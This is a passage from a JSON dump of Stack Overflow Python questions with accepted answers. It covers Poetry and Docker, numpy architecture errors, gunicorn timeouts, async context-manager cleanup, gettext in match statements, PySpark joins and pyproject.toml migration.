image\nFROM python-base as example-app\n\n# Copy Poetry to app image\nCOPY --from=poetry-base ${POETRY_VENV} ${POETRY_VENV}\n\n# Add Poetry to PATH\nENV PATH=\"${PATH}:${POETRY_VENV}/bin\"\n\nWORKDIR /app\n\n# Copy Dependencies\nCOPY poetry.lock pyproject.toml ./\n\n# [OPTIONAL] Validate the project is properly configured\nRUN poetry check\n\n# Install Dependencies\nRUN poetry install --no-interaction --no-cache --without dev\n\n# Copy Application\nCOPY . /app\n\n# Run Application\nEXPOSE 5000\nCMD [ \"poetry\", \"run\", \"python\", \"-m\", \"flask\", \"run\", \"--host=0.0.0.0\" ]\n\napp.py\nfrom flask import Flask\napp = Flask(__name__)\n\n@app.route('/')\ndef hello_world():\n    return 'Hello, Docker!'\n\npyproject.toml\n[tool.poetry]\nname = \"python-poetry-docker-example\"\nversion = \"0.1.0\"\ndescription = \"\"\nauthors = [\"Someone \"]\n\n[tool.poetry.dependencies]\npython = \"^3.10\"\nFlask = \"^2.1.2\"\n\n[tool.poetry.dev-dependencies]\n\n[build-system]\nrequires = [\"poetry-core>=1.0.0\"]\nbuild-backend = \"poetry.core.masonry.api\"\n\npoetry.lock\n[[package]]\nname = \"click\"\nversion = \"8.1.3\"\ndescription = \"Composable command line interface toolkit\"\ncategory = \"main\"\noptional = false\npython-versions = \">=3.7\"\n\n[package.dependencies]\n... more lines ommitted\n\nFull contents in gist.\n"
}
{
    "Id": 72920577,
    "PostTypeId": 1,
    "Title": "(mach-o file, but is an incompatible architecture (have 'arm64', need 'x86_64'))",
    "Body": "I have a problem when I run a .py file on a Macbook Air M1:\n[Running] python3 -u \"/Users/kaiyuwei/Documents/graduation project/metaheuristics/run_CRO.py\"\nTraceback (most recent call last):\n  File \"/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/__init__.py\", line 23, in \n    from . import multiarray\n  File \"/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/multiarray.py\", line 10, in \n    from . import overrides\n  File \"/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/overrides.py\", line 6, in \n    from numpy.core._multiarray_umath import (\nImportError: dlopen(/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/_multiarray_umath.cpython-38-darwin.so, 0x0002): tried: '/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/_multiarray_umath.cpython-38-darwin.so' (mach-o file, but is an incompatible architecture (have 'arm64', need 'x86_64'))\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"/Users/kaiyuwei/Documents/graduation project/metaheuristics/run_CRO.py\", line 1, in \n    from models.multiple_solution.evolutionary_based.CRO import BaseCRO\n  File \"/Users/kaiyuwei/Documents/graduation project/metaheuristics/models/multiple_solution/evolutionary_based/CRO.py\", line 1, in \n    import numpy as np\n  File \"/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/__init__.py\", line 140, in \n    from . import core\n  File \"/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/__init__.py\", line 49, in \n    raise ImportError(msg)\nImportError: \n\nIMPORTANT: PLEASE READ THIS FOR ADVICE ON HOW TO SOLVE THIS ISSUE!\n\nImporting the numpy C-extensions failed. This error can happen for\nmany reasons, often due to issues with your setup or how NumPy was\ninstalled.\n\nWe have compiled some common reasons and troubleshooting tips at:\n\n    https://numpy.org/devdocs/user/troubleshooting-importerror.html\n\nPlease note and check the following:\n\n  * The Python version is: Python3.8 from \"/Library/Developer/CommandLineTools/usr/bin/python3\"\n  * The NumPy version is: \"1.23.1\"\n\nand make sure that they are the versions you expect.\nPlease carefully study the documentation linked above for further help.\n\nOriginal error was: dlopen(/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/_multiarray_umath.cpython-38-darwin.so, 0x0002): tried: '/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/_multiarray_umath.cpython-38-darwin.so' (mach-o file, but is an incompatible architecture (have 'arm64', need 'x86_64'))\n\n\n[Done] exited with code=1 in 0.055 seconds\n\nI think the reason is that I'm using the numpy package for 'x86_64', so I tried to use pip install numpy --upgrade to upgrade numpy, but I got output like:\nRequirement already satisfied: numpy in /Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages (1.23.1)\n\nI also tried python3 -m pip install --upgrade pip to upgrade python, but still;\nRequirement already satisfied: pip in /Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages (22.1.2)\n\nCan anyone help me?\n",
    "AcceptedAnswerId": 72920835,
    "AcceptedAnswer": "I solved the problem by simply uninstalling numpy package:\npip3 uninstall numpy\n\nand reinstalling it:\npip3 install numpy\n\n"
}
{
    "Id": 72118249,
    "PostTypeId": 1,
    "Title": "Why is branchless programming and built-ins slower?",
    "Body": "I found 2 branchless functions that find the maximum of two numbers in python, and compared them to an if statement and the built-in max function. I thought the branchless or the built-in functions would be the fastest, but the fastest was the if-statement function by a large margin. Does anybody know why this is? Here are the functions:\nIf-statement (2.16 seconds for 25000 operations):\ndef max1(a, b):\n    if a > b:\n        return a\n    return b\n\nBuilt-in (4.69 seconds for 25000 operations):\ndef max2(a, b):\n    return max(a, b)\n\nBranchless 1 (4.12 seconds for 25000 operations):\ndef max3(a, b):\n    return (a > b) * a + (a <= b) * b\n\nBranchless 2 (5.34 seconds for 25000 operations):\ndef max4(a, b):\n    diff = a - b\n    return a - (diff & diff >> 31)\n\n",
    "AcceptedAnswerId": 72118450,
    "AcceptedAnswer": "Your expectations about branching vs. branchless code apply to low-level languages like assembly and C. Branchless code can be faster in low-level languages because it prevents slowdowns caused by branch prediction misses. (Note: this means branchless code can be faster, but it will not necessarily be.)\nPython is a high-level language. Assuming you are using the CPython interpreter: for every bytecode instruction you execute, the interpreter has to branch on the kind of opcode, and typically many other things. For example, even the simple  operator requires a branch to check for the  opcode, another branch to check whether the object's class implements a __lt__ method, more branches to check whether the right-hand-side value is of a valid type for the comparison to be performed, and probably several other branches. Even your so-called \"branchless\" code will in practice result in a lot of branching for these reasons.\nBecause Python is so high-level, each bytecode instruction is actually doing quite a lot of work compared to a single machine-code instruction. So the performance of simple code like this will mainly depend on how many bytecode instructions have to be interpreted:\n\nYour max1 function has to do three loads of local variables, a comparison, a conditional jump and a return. That's six.\nYour max2 function does two loads of local variables, one load of a global variable (referencing the built-in max), and also makes a function call; that requires passing arguments, and is relatively expensive compared to other bytecode instructions. On top of that, the built-in function itself has to do the same work as your own max1 function, so no wonder max2 is slower.\nYour max3 function does six loads of local variables, two comparisons, two multiplications, one addition, and one return. That's twelve instructions, so we should expect it to take about twice as long as max1.\nLikewise max4 does five loads of local variables, one store to a local variable, one load of a constant, two subtractions, one bitshift, one bitwise \"and\", and one return. That's twelve instructions again.\n\nThat said, note that if we compare your max1 with the built-in function max directly, instead of your max2 which has an extra function call, your max1 function is still a bit faster than the built-in max. This is probably because the built-in max accepts a variable number of arguments, which may involve building a tuple of arguments, and the built-in max function also has a branch to check if it was called with a single iterable argument (e.g. max([3, 1, 4, 2])), and handle that case differently; your max1 function doesn't do those things.\n"
}
{
    "Id": 72155476,
    "PostTypeId": 1,
    "Title": "Is this \"greedy\" += behavior of lists guaranteed?",
    "Body": "I occasionally use the \"trick\" to extend a list by a mapped version of itself, for example to efficiently compute powers of 2:\nfrom operator import mul\n\npowers = [1]\npowers += map(mul, [2] * 10, powers)\n\nprint(powers)   # prints [1, 2, 4, 8, 16, 32, 64, 128, 256, 512, 1024]\n\nThis relies on the += immediately appending each value from map to the list, so that the map then finds it and the procedure continues. In other words, it needs to work like this:\npowers = [1]\nfor value in map(mul, [2] * 10, powers):\n    powers.append(value)\n\nAnd not first compute and store the whole right-hand side like this, where powers ends up being [1, 2]:\npowers = [1]\npowers += list(map(mul, [2] * 10, powers))\n\nIs it somewhere guaranteed that it works like it does? I checked the Mutable Sequence Types documentation but it doesn't say much about it other than implying equivalence of s += t and s.extend(t). It does refer to MutableSequence, whose source code includes this:\n    def extend(self, values):\n        'S.extend(iterable) -- extend sequence by appending elements from the iterable'\n        if values is self:\n            values = list(values)\n        for v in values:\n            self.append(v)\n\n    def __iadd__(self, values):\n        self.extend(values)\n        return self\n\nThis does suggest that it's indeed supposed to work like it does and like I want it, but some source code being what it is doesn't feel as safe as a guarantee in the documentation.\n",
    "AcceptedAnswerId": 72155954,
    "AcceptedAnswer": "I don't see any tests or docs that the greedy behavior is guaranteed; however, I do think it is the expected behavior and that code in the wild relies on it.\nFWIW, += with lists is equivalent to list.extend(), so your \"trick\" boils down to:\n>>> powers = [1]\n>>> powers.extend(2*x for x in islice(powers, 10))\n>>> powers\n[1, 2, 4, 8, 16, 32, 64, 128, 256, 512, 1024]\n\nWhile I haven't found a guarantee for += or extend, we do have a guarantee that the list iterator allows mutation while iterating.\u00b9  So, this code is on firm ground:\n>>> powers = [1]\n>>> for x in powers:\n        if len(powers) == 10:\n            break\n        powers.append(2 * x)\n\n>>> powers\n[1, 2, 4, 8, 16, 32, 64, 128, 256, 512]\n\n\u00b9 See the second paragraph following the table at:\nhttps://docs.python.org/3/library/stdtypes.html#common-sequence-operations:\n\nForward and reversed iterators over mutable sequences access values\nusing an index. That index will continue to march forward (or\nbackward) even if the underlying sequence is mutated. The iterator\nterminates only when an IndexError or a StopIteration is encountered\n(or when the index drops below zero).\n\n"
}
{
    "Id": 72166020,
    "PostTypeId": 1,
    "Title": "how to install multiple packages in one line using conda?",
    "Body": "I need to install below multiple packages using conda. I am not sure what is conda-forge? some uses conda-forge, some doesn't use it. Is it possible to install them in one line without installing them one by one?  Thanks\nconda install -c conda-forge dash-daq\nconda install -c conda-forge dash-core-components\nconda install -c conda-forge dash-html-components\nconda install -c conda-forge dash-bootstrap-components\nconda install -c conda-forge dash-table\nconda install -c plotly jupyter-dash\n\n\n",
    "AcceptedAnswerId": 72166052,
    "AcceptedAnswer": "Why some packages have to be installed through conda forge:\nConda official repository only feature a few verified packages. A vast portion of python packages that are otherwise available through pip are installed through community led channel called conda-forge. You can visit their site to learn more about it.\nHow to install multiple packages in a single line?\nThe recommended way to install multiple packages is to create a .yml file and feed conda this. You can specify the version number for each package as well.\nThe following example file can be fed to conda through conda install --file:\nappdirs=1.4.3\nasn1crypto=0.24.0\n...\nzope=1.0\nzope.interface=4.5.0\n\nTo specify different channel for each package in this environment.yml file, you can use the :: syntax.\ndependencies:\n  - python=3.6\n  - bagit\n  - conda-forge::beautifulsoup4\n\n"
}
{
    "Id": 72907474,
    "PostTypeId": 1,
    "Title": "Gunicorn with gevent does not enforce timeout",
    "Body": "Let's say I have a simple flask app:\nimport time\nfrom flask import Flask\n\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef index():\n    for i in range(10):\n        print(f\"Slept for {i + 1}/{seconds} seconds\")\n        time.sleep(1)\n    return \"Hello world\"\n\nI can run it with gunicorn with a 5 second timeout:\ngunicorn app:app -b 127.0.0.1:5000 -t 5\n\nAs expected, http://127.0.0.1:5000 times out after 5 seconds:\nSlept for 1/10 seconds\nSlept for 2/10 seconds\nSlept for 3/10 seconds\nSlept for 4/10 seconds\nSlept for 5/10 seconds\n[2022-07-07 22:45:01 -0700] [57177] [CRITICAL] WORKER TIMEOUT (pid:57196)\n\nNow, I want to run gunicorn with an async worker to allow the web server to use its available resources more efficiently, maximizing time that otherwise would be spent idling to do additional work instead. I'm using gevent, still with a timeout of 5 seconds.\ngunicorn app:app -b 127.0.0.1:5000 -t 5 -k gevent\n\nUnexpectedly, http://127.0.0.1:5000 does NOT time out:\nSlept for 1/10 seconds\nSlept for 2/10 seconds\nSlept for 3/10 seconds\nSlept for 4/10 seconds\nSlept for 5/10 seconds\nSlept for 6/10 seconds\nSlept for 7/10 seconds\nSlept for 8/10 seconds\nSlept for 9/10 seconds\nSlept for 10/10 seconds\n\nLooks like this is a known issue with gunicorn. The timeout only applies to the default sync worker, not async workers: https://github.com/benoitc/gunicorn/issues/2695\n\nuWSGI is an alternate option to gunicorn. I'm not as familiar with it. Looks like its timeout option is called harakiri and it can be run with gevent:\nuwsgi --http 127.0.0.1:5000 --harakiri 5 --master -w app:app --gevent 100\n\nuWSGI's timeout sometimes works as expected with gevent:\nSlept for 1/10 seconds\nSlept for 2/10 seconds\nSlept for 3/10 seconds\nSlept for 4/10 seconds\nSlept for 5/10 seconds\nThu Jul  7 23:20:59 2022 - *** HARAKIRI ON WORKER 1 (pid: 59836, try: 1) ***\nThu Jul  7 23:20:59 2022 - HARAKIRI !!! worker 1 status !!!\nThu Jul  7 23:20:59 2022 - HARAKIRI [core 99] 127.0.0.1 - GET / since 1657261253\nThu Jul  7 23:20:59 2022 - HARAKIRI !!! end of worker 1 status !!!\nDAMN ! worker 1 (pid: 59836) died, killed by signal 9 :( trying respawn ...\n\nBut other times it doesn't time out so it appears to be pretty flaky.\n\nIs there anyway to enforce a timeout using gunicorn with an async worker? If not, are there any other web servers that enforce a consistent timeout with an async worker, similar to uWSGI?\n",
    "AcceptedAnswerId": 72938801,
    "AcceptedAnswer": "From https://docs.gunicorn.org/en/stable/settings.html#timeout:\n\nWorkers silent for more than this many seconds are killed and restarted.\n\n\nFor the non sync workers it just means that the worker process is still communicating and is not tied to the length of time required to handle a single request.\n\nSo timeout is likely functioning by design \u2014 as worker timeout, not request timeout.\nYou can subclass GeventWorker to override handle_request() with gevent.Timeout:\nimport gevent\nfrom gunicorn.workers.ggevent import GeventWorker\n\n\nclass MyGeventWorker(GeventWorker):\n\n    def handle_request(self, listener_name, req, sock, addr):\n        with gevent.Timeout(self.cfg.timeout):\n            super().handle_request(listener_name, req, sock, addr)\n\nUsage:\n# gunicorn app:app -b 127.0.0.1:5000 -t 5 -k gevent\ngunicorn app:app -b 127.0.0.1:5000 -t 5 -k app.MyGeventWorker\n\n"
}
{
    "Id": 71183960,
    "PostTypeId": 1,
    "Title": "Short way to get all field names of a pydantic class",
    "Body": "Minimal example of the class:\nfrom pydantic import BaseModel\n\nclass AdaptedModel(BaseModel):\n    def get_all_fields(self, alias=False):\n        return list(self.schema(by_alias=alias).get(\"properties\").keys())\n\nclass TestClass(AdaptedModel):\n    test: str\n\nThe way it works:\ndm.TestClass.get_all_fields(dm.TestClass)\n\nIs there a way to make it work without giving the class again?\nDesired way to get all field names:\ndm.TestClass.get_all_fields()\n\nIt would also work if the field names are assigned to an attribute. Just any way to make it make it more readable\n",
    "AcceptedAnswerId": 72480774,
    "AcceptedAnswer": "What about just using __fields__:\nfrom pydantic import BaseModel\n\nclass AdaptedModel(BaseModel):\n    parent_attr: str\n\nclass TestClass(AdaptedModel):\n    child_attr: str\n        \nTestClass.__fields__\n\nOutput:\n{'parent_attr': ModelField(name='parent_attr', type=str, required=True),\n 'child_attr': ModelField(name='child_attr', type=str, required=True)}\n\nThis is just a dict and you could get only the field names simply by: TestClass.__fields__.keys()\nSee model properties: https://pydantic-docs.helpmanual.io/usage/models/#model-properties\n"
}
{
    "Id": 71861779,
    "PostTypeId": 1,
    "Title": "MWAA - Airflow - PythonVirtualenvOperator requires virtualenv",
    "Body": "I am using AWS's MWAA service (2.2.2) to run a variety of DAGs, most of which are implemented with standard PythonOperator types. I bundle the DAGs into an S3 bucket alongside any shared requirements, then point MWAA to the relevant objects & versions. Everything runs smoothly so far.\nI would now like to implement a DAG using the PythonVirtualenvOperator type, which AWS acknowledge is not supported out of the box. I am following their guide on how to patch the behaviour using a custom plugin, but continue to receive an error from Airflow, shown at the top of the dashboard in big red writing:\n\nDAG Import Errors (1)\n... ...\nAirflowException: PythonVirtualenvOperator requires virtualenv, please install it.\n\nI've confirmed that the plugin is indeed being picked up by Airflow (I see it referenced in the admin screen), and for the avoidance of doubt I am using the exact code provided by AWS in their examples for the DAG. AWS's documentation on this is pretty light and I've yet to stumble across any community discussion for the same.\nFrom AWS's docs, we'd expect the plugin to run at startup prior to any DAGs being processed. The plugin itself appears to effectively rewrite the venv command to use the pip-installed version, rather than that which is installed on the machine, however I've struggled to verify that things are happening in the order I expect. Any pointers on debugging the instance's behavior would be very much appreciated.\nHas anyone faced a similar issue? Is there a gap in the MWAA documentation that needs addressing? Am I missing something incredibly obvious?\nPossibly related, but I do see this warning in the scheduler's logs, which may indicate why MWAA is struggling to resolve the dependency?\n\nWARNING: The script virtualenv is installed in '/usr/local/airflow/.local/bin' which is not on PATH.\n\n",
    "AcceptedAnswerId": 72203130,
    "AcceptedAnswer": "Airflow uses shutil.which to look for virtualenv. The installed virtualenv via requirements.txt isn't on the PATH. Adding the path to virtualenv to PATH solves this.\nThe doc here is wrong https://docs.aws.amazon.com/mwaa/latest/userguide/samples-virtualenv.html\nimport os\nfrom airflow.plugins_manager import AirflowPlugin\nimport airflow.utils.python_virtualenv \nfrom typing import List\ndef _generate_virtualenv_cmd(tmp_dir: str, python_bin: str, system_site_packages: bool) -> List[str]:\n    cmd = ['python3','/usr/local/airflow/.local/lib/python3.7/site-packages/virtualenv', tmp_dir]\n    if system_site_packages:\n        cmd.append('--system-site-packages')\n    if python_bin is not None:\n        cmd.append(f'--python={python_bin}')\n    return cmd\nairflow.utils.python_virtualenv._generate_virtualenv_cmd=_generate_virtualenv_cmd\n#This is the added path code\nos.environ[\"PATH\"] = f\"/usr/local/airflow/.local/bin:{os.environ['PATH']}\"\nclass VirtualPythonPlugin(AirflowPlugin):                \n    name = 'virtual_python_plugin'\n\n"
}
{
    "Id": 73457379,
    "PostTypeId": 1,
    "Title": "Python regex and leading 0 in capturing group",
    "Body": "I'm writing a script in python 3 to automatically rename files. But I have a problem with the captured group in a regex.\nI have these kinds of files :\ntest tome 01 something.cbz\ntest tome 2 something.cbz\ntest tome 20 something.cbz\n\nAnd I would like to have :\ntest 001 something.cbz\ntest 002 something.cbz\ntest 020 something.cbz\n\nI tried several bits of code:\nExample 1:\nname = re.sub('tome [0]{0,1}(\\d{1,})', str('\\\\1').zfill(3), name)\n\nThe result is:\ntest 01 something.cbz\ntest 02 something.cbz\ntest 020 something.cbz\n\nExample 2:\nname = re.sub('tome (\\d{1,})', str('\\\\1').lstrip(\"0\").zfill(3), name)\n\nThe result is:\ntest 001 something.cbz\ntest 02 something.cbz\ntest 020 something.cbz\n\n",
    "AcceptedAnswerId": 73457472,
    "AcceptedAnswer": "You can run the zfill(3) on the .group(1) value after stripping the zeroes from the left side:\nimport re\n\ns = (\"test tome 01 something.cbz\\n\"\n            \"test tome 2 something.cbz\\n\"\n            \"test tome 20 something.cbz\")\n\nresult = re.sub(\n    r'tome (\\d+)',\n    lambda x: x.group(1).lstrip(\"0\").zfill(3),\n    s\n)\nprint(result)\n\nOutput\ntest 001 something.cbz\ntest 002 something.cbz\ntest 020 something.cbz\n\n"
}
{
    "Id": 72842597,
    "PostTypeId": 1,
    "Title": "Why is __aexit__ not fully executed when it has await inside?",
    "Body": "This is the simplified version of my code:\nmain is a coroutine which stops after the second iteration.\nget_numbers is an async generator which yields numbers but within an async context manager.\nimport asyncio\n\n\nclass MyContextManager:\n    async def __aenter__(self):\n        print(\"Enter to the Context Manager...\")\n        return self\n\n    async def __aexit__(self, exc_type, exc_value, exc_tb):\n        print(exc_type)\n        print(\"Exit from the Context Manager...\")\n        await asyncio.sleep(1)\n        print(\"This line is not executed\")  # <-------------------\n        await asyncio.sleep(1)\n\n\nasync def get_numbers():\n    async with MyContextManager():\n        for i in range(30):\n            yield i\n\n\nasync def main():\n    async for i in get_numbers():\n        print(i)\n        if i == 1:\n            break\n\n\nasyncio.run(main())\n\nAnd the output is:\nEnter to the Context Manager...\n0\n1\n\nExit from the Context Manager...\n\nI have two questions actually:\n\nFrom my understanding, AsyncIO schedules a Task to be called soon in the next cycle of the event loop and gives __aexit__ a chance to execute. But the line print(\"This line is not executed\") is not executed. Why is that? Is it correct to assume that if we have an await statement inside the __aexit__, the code after that line is not going to execute at all and we shouldn't rely on that for cleaning?\n\n\n\nOutput of the help() on async generators shows that:\n\n |  aclose(...)\n |      aclose() -> raise GeneratorExit inside generator.\n\nso why I get  exception inside the __aexit__ ?\n* I'm using Python 3.10.4\n",
    "AcceptedAnswerId": 73065347,
    "AcceptedAnswer": "This is not specific to __aexit__ but to all async code: When an event loop shuts down it must decide between cancelling remaining tasks or preserving them. In the interest of cleanup, most frameworks prefer cancellation instead of relying on the programmer to clean up preserved tasks later on.\nThis kind of shutdown cleanup is a separate mechanism from the graceful unrolling of functions, contexts and similar on the call stack during normal execution. A context manager that must also clean up during cancellation must be specifically prepared for it. Still, in many cases it is fine not to be prepared for this since many resources fail safe by themselves.\n\nIn contemporary event loop frameworks there are usually three levels of cleanup:\n\nUnrolling: The __aexit__ is called when the scope ends and might receive an exception that triggered the unrolling as an argument. Cleanup is expected to be delayed as long as necessary. This is comparable to __exit__ running synchronous code.\nCancellation: The __aexit__ may receive a CancelledError1 as an argument or as an exception on any await/async for/async with. Cleanup may delay this, but is expected to proceed as fast as possible. This is comparable to KeyboardInterrupt cancelling synchronous code.\nClosing: The __aexit__ may receive a GeneratorExit as an argument or as an exception on any await/async for/async with. Cleanup must proceed as fast as possible. This is comparable to GeneratorExit closing a synchronous generator.\n\nTo handle cancellation/closing, any async code \u2013 be it in __aexit__ or elsewhere \u2013 must expect to handle CancelledError or GeneratorExit. While the former may be delayed or suppressed, the latter should be dealt with immediately and synchronously2.\n    async def __aexit__(self, exc_type, exc_value, exc_tb):\n        print(\"Exit from the Context Manager...\")\n        try:\n            await asyncio.sleep(1)  # an exception may arrive here\n        except GeneratorExit:\n            print(\"Exit stage left NOW\")\n            raise\n        except asyncio.CancelledError:\n            print(\"Got cancelled, just cleaning up a few things...\")\n            await asyncio.sleep(0.5)\n            raise\n        else:\n            print(\"Nothing to see here, taking my time on the way out\")\n            await asyncio.sleep(1)\n\nNote: It is generally not possible to exhaustively handle these cases. Different forms of cleanup may interrupt one another, such as unrolling being cancelled and then closed. Handling cleanup is only possible on a best effort basis; robust cleanup is achieved by fail safety, for example via transactions, instead of explicit cleanup.\n\nCleanup of asynchronous generators in specific is a tricky case since they can be cleaned up by all cases at once: Unrolling as the generator finishes, cancellation as the owning task is destroyed or closing as the generator is garbage collected. The order at which the cleanup signals arrive is implementation dependent.\nThe proper way to address this is not to rely on implicit cleanup in the first place. Instead, every coroutine should make sure that all its child resources are closed before the parent exits. Notably, an async generator may hold resources and needs closing.\nasync def main():\n    # create a generator that might need cleanup\n    async_iter = get_numbers()\n    async for i in async_iter:\n        print(i)\n        if i == 1:\n            break\n    # wait for generator clean up before exiting\n    await async_iter.aclose()\n\nIn recent versions, this pattern is codified via the aclosing context manager.\nfrom contextlib import aclosing\n\nasync def main():\n    # create a generator and prepare for its cleanup\n    async with aclosing(get_numbers()) as async_iter:\n        async for i in async_iter:\n            print(i)\n            if i == 1:\n                break\n\n\n1The name and/or identity of this exception may vary.\n2While it is possible to await asynchronous things during GeneratorExit, they may not yield to the event loop. A synchronous interface is advantageous to enforce this.\n"
}
{
    "Id": 72225191,
    "PostTypeId": 1,
    "Title": "How can I apply gettext translations to string literals in case statements?",
    "Body": "I need to add gettext translation to all the string literals in our code, but it doesn't work with literals in case statements.\nThis failed attempt gives SyntaxError: Expected ':':\nfrom gettext import gettext as _\n\ndirection = input(_('Enter a direction: '))   # <-- This works\nmatch direction:\n    case _('north'):                          # <-- This fails\n        adj = 1, 0\n    case _('south'):\n        adj = -1, 0\n    case _('east'):\n        adj = 0, 1\n    case _('west'):\n        adj = 0, -1\n    case _:\n        raise ValueError(_('Unknown direction'))\n\nWhat does the error mean and how can the directions be marked for translation?\n",
    "AcceptedAnswerId": 72225192,
    "AcceptedAnswer": "What does the error mean?\nThe grammar for the match/case statement treats the _ as a wildcard pattern.  The only acceptable token that can follow is a colon.  Since your code uses an open parenthesis, a SyntaxError is raised.\nHow to fix it\nSwitch from a literal pattern such as case \"north\": ... to a value pattern such as case Directions.north: ... which uses dot-operator.\nThe translation can then be performed upstream, outside of the case statement:\nfrom gettext import gettext as _\n\nclass Directions:\n    north = _('north')\n    south = _('south')\n    east = _('east')\n    west = _('west')\n\ndirection = input(_('Enter a direction: '))\nmatch direction:\n    case Directions.north:\n        adj = 1, 0\n    case Directions.south:\n        adj = -1, 0\n    case Directions.east:\n        adj = 0, 1\n    case Directions.west:\n        adj = 0, -1\n    case _:\n        raise ValueError(_('Unknown direction'))\n\nNot only do the string literals get translated, the case statements are more readable as well.\nMore advanced and dynamic solution\nThe above solution only works if the choice of language is constant.  If the language can change (perhaps in an online application serving users from difference countries), dynamic lookups are needed.\nFirst we need a descriptor to dynamically forward value pattern attribute lookups to function calls:\nclass FuncCall:\n    \"Descriptor to convert fc.name to func(name).\"\n\n    def __init__(self, func):\n        self.func = func\n\n    def __set_name__(self, owner, name):\n        self.name = name\n\n    def __get__(self, obj, objtype=None):\n        return self.func(self.name)\n\nWe use it like this:\nclass Directions:\n    north = FuncCall(_)  # calls _('north') for every lookup\n    south = FuncCall(_)\n    east = FuncCall(_)\n    west = FuncCall(_)\n\ndef convert(direction):\n    match direction:\n        case Directions.north:\n            return 1, 0\n        case Directions.south:\n            return -1, 0\n        case Directions.east:\n            return 0, 1\n        case Directions.west:\n            return 0, -1\n        case _:\n            raise ValueError(_('Unknown direction'))\n    print('Adjustment:', adj)\n\nHere is a sample session:\n>>> set_language('es')   # Spanish\n>>> convert('sur')\n(-1, 0)\n>>> set_language('fr')   # French\n>>> convert('nord')\n(1, 0)\n\nNamespaces for the Value Pattern\nAny namespace with dotted lookup can be used in the value pattern:  SimpleNamespace, Enum, modules, classes, instances, etc.\nHere a class was chosen because it is simple and will work with the descriptor needed for the more advanced solution.\nEnum wasn't considered because it is much more complex and because its metaclass logic interferes with the descriptors.  Also, Enum is intended for giving symbolic names to predefined constants rather than for dynamically computed values like we're using here.\n"
}
{
    "Id": 72298911,
    "PostTypeId": 1,
    "Title": "Where to locate virtual environment installed using poetry | Where to find poetry installed virtual environment",
    "Body": "I installed poetry using the following command:-\n(Invoke-WebRequest -Uri https://raw.githubusercontent.com/python-poetry/poetry/master/get-poetry.py -UseBasicParsing).Content | python - \nTo know more about it refer this.\nNow I wanted to create a virtual environment, that I created it using the following command:-\npoetry config virtualenvs.in-project true\nTo know more about it refer this.\nBut after doing this, I can`t see any .venv(virtual environment) folder.\nTo check if virtual environment is there, we use the following command:-\npoetry config virtualenvs.in-project\nand if the above command return true, implies you have it.\nI'm getting true, also the location mentioned on the docs I cant see it there.\nCould anyone tell me how to locate the virtual environment now?\n",
    "AcceptedAnswerId": 72298912,
    "AcceptedAnswer": "There are 2 commands I found, that can find where is the virtual environment is located.\n\nCommand:- poetry show -v\nThe first line of $ poetry show -v will tell you where the virtual environment is located.\nAnd the rest will tell you what all libs are there in it.\n\nCommand:- poetry env info -p\nThe above command will give you just the location of virtual environment.\n\n\nHope this will solve your purpose.\nThank you.\n"
}
{
    "Id": 73395718,
    "PostTypeId": 1,
    "Title": "Join dataframes and rename resulting columns with same names",
    "Body": "Shortened example:\nvals1 = [(1, \"a\"), \n        (2, \"b\"), \n      ]\ncolumns1 = [\"id\",\"name\"]\ndf1 = spark.createDataFrame(data=vals1, schema=columns1)\n\nvals2 = [(1, \"k\"), \n      ]\ncolumns2 = [\"id\",\"name\"]\ndf2 = spark.createDataFrame(data=vals2, schema=columns2)\n\ndf1 = df1.alias('df1').join(df2.alias('df2'), 'id', 'full')\ndf1.show()\n\nThe result has one column named id and two columns named name. How do I rename the columns with duplicate names, assuming that the real dataframes have tens of such columns?\n",
    "AcceptedAnswerId": 73459268,
    "AcceptedAnswer": "Another method to rename only the intersecting columns\nfrom typing import List\n\nfrom pyspark.sql import DataFrame\n\n\ndef join_intersect(df_left: DataFrame, df_right: DataFrame, join_cols: List[str], how: str = 'inner'):\n    intersected_cols = set(df1.columns).intersection(set(df2.columns))\n    cols_to_rename = [c for c in intersected_cols if c not in join_cols]\n\n    for c in cols_to_rename:\n        df_left = df_left.withColumnRenamed(c, f\"{c}__1\")\n        df_right = df_right.withColumnRenamed(c, f\"{c}__2\")\n\n    return df_left.join(df_right, on=join_cols, how=how)\n\n\nvals1 = [(1, \"a\"), (2, \"b\")]\ncolumns1 = [\"id\", \"name\"]\ndf1 = spark.createDataFrame(data=vals1, schema=columns1)\nvals2 = [(1, \"k\")]\ncolumns2 = [\"id\", \"name\"]\ndf2 = spark.createDataFrame(data=vals2, schema=columns2)\n\ndf_joined = join_intersect(df1, df2, ['name'])\ndf_joined.show()\n\n"
}
{
    "Id": 72352801,
    "PostTypeId": 1,
    "Title": "Migration from setup.py to pyproject.toml: how to specify package name?",
    "Body": "I'm currently trying to move our internal projects away from setup.py to pyproject.toml (PEP-518). I'd like to not use build backend specific configuration if possible, even though I do specify the backend in the [build-system] section by require'ing it.\nThe pyproject.toml files are more or less straight-forward translations of the setup.py files, with the metadata set according to PEP-621, including the dependencies. We are using setuptools_scm for the determination of the version, therefore the version field ends up in the dynamic section.\nWe used to set the packages parameter to setup in our setup.py files, but I couldn't find any corresponding field in pyproject.toml, so I simply omitted it.\nWhen building the project using python3 -m build ., I end up with a package named UNKNOWN, even though I have the name field set in the [project] section. It seems that this breaks very early in the build:\n$ python -m build .\n* Creating virtualenv isolated environment...\n* Installing packages in isolated environment... (setuptools, setuptools_scm[toml]>=6.2, wheel)\n* Getting dependencies for sdist...\nrunning egg_info\nwriting UNKNOWN.egg-info/PKG-INFO\n....\n\nI'm using python 3.8.11 and the following packages:\nbuild==0.8.0\ndistlib==0.3.4\nfilelock==3.4.1\npackaging==21.3\npep517==0.12.0\npip==22.0.4\nplatformdirs==2.4.0\npyparsing==3.0.9\nsetuptools==62.1.0\nsix==1.16.0\ntomli==1.2.3\nvirtualenv==20.14.1\nwheel==0.37.1\n\nMy (abbreviated) pyproject.toml looks like 